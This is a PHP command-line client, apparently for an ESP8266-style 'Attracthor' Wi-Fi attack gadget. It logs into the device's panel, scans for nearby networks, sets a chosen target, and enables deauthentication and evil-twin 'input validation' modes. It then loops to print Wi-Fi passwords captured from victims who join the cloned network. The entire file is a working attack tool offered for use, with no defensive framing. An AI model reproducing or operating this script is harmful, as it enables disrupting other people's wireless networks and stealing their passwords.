<?php
error_reporting(0);
function curl($url, $ua, $data= null){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'att.txt');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
/**	curl_setopt($ch, CURLOPT_VERBOSE, 1);**/
	$result = curl_exec($ch);
	return $result;
}
 function get($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'att.txt');
	$result = curl_exec($ch);
	return $result;
}
$ua = array(
"Host: 192.168.4.1",
"Connection: keep-alive",
"Cache-Control: max-age=0",
"Upgrade-Insecure-Requests: 1",
"Save-Data: on",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Referer: http://192.168.4.1/login",
"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
  );
  $bar = "Attracthor-cli By Febryan\n\n";
print $bar;
print "Please Login...\n[*] Password: ";
$pass = trim(fgets(STDIN));

$data = "strWebUsername=razor&PASSWORD=$pass&SUBMIT=Submit";
$login = curl("http://192.168.4.1/login", $ua, $data);

$beranda = explode('o_deauth', $login);
$log = $beranda[1];
if(isset($log)){
print "Success Login\n";
sleep(5);
wifi:
system('clear');
print $bar;
print "[#] Wifi List:\n";
$survey = get('http://192.168.4.1/survey');
  for($a=1; $a<5; $a++){

  $list = explode('?', $survey);
  $list = explode('>', $list[$a]);
  print "$list[0]\n";
}
print "[5]Refresh \n";
print "\n[>]Copy BSSID&SSID in here: ";
$selet = trim(fgets(STDIN));
if($selet == 5){
  goto wifi;
}
$gas = get("http://192.168.4.1/settarget?$selet");
print "Waiting...";
sleep(2);
system('clear');
menu:
$getmenu= get('http://192.168.4.1/setup');
$targe = explode('/survey>', $getmenu);
$targe = explode('</a>', $targe[1]);
$obot = explode('o_autoreboot>', $getmenu);
$obot = explode('</a>', $obot[1]);
$getd = explode('o_deauth>', $getmenu);
$getd = explode('</a>', $getd[1]);
$getv = explode('o_inputvalid>', $getmenu);
$getv = explode('</a>', $getv[1]);
$deauth = $getd[0];
$inputv = $getv[0];
$target = $targe[0];
$autor = $obot[0];
print $bar;
print "\nWifi Target[$target]\n\nAttack Mode\n[1]Deauth [$deauth]\n[2]Input Validation[$inputv]\n[3]Auto Reboot [$autor]\n\n[Enter To Attack]\n[>]Select: ";
$menu = trim(fgets(STDIN));
if($menu == 1){
$getdeauth = get('http://192.168.4.1/o_deauth');
  system('clear');
  goto menu;
}
if($menu == 2){
    $getinput= get('http://192.168.4.1/o_inputvalid');
     system('clear');
     goto menu;
}
if($menu == 3){
$getautor = get('http://192.168.4.1/o_autoreboot');
  system('clear');
  goto menu;
}
system('clear');
print $bar;
print "[*] Turn off wifi attracthor from your device\n";
sleep(4);
print "[*] Waiting for the attracthor indicator lamp off\n";
sleep(150);
print "[*] Indicator Off? Connect Wifi Clone\n";
sleep(5);
print "[>] already? [Enter to Continue]\n";
$indi = trim(fgets(STDIN));
pass:
system('clear');
print $bar;
$info = get('http://192.168.4.1/password.txt');
print "Password:\n$info\n";
sleep(2);
goto pass;
}else{
  print "Password Wrong\n";
}
?>
